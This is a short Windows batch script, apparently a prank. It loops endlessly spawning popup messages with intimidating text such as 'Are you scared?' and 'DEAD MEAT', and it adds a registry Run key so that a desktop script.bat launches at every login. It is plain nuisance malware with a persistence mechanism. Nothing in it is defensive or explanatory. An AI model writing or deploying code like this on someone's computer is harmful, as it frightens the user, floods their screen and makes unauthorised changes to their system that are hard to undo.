@echo off
:start
start msg * "Are you scared?"
start msg * "SAY HI..."
start msg * "UR COOKED"
start msg * "DEAD MEAT"
start msg * "bye"
ping -n 1 127.0.0.1 >nul
goto start
@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d ""C:\Users\Sebas\OneDrive\Desktop\script.bat"" /f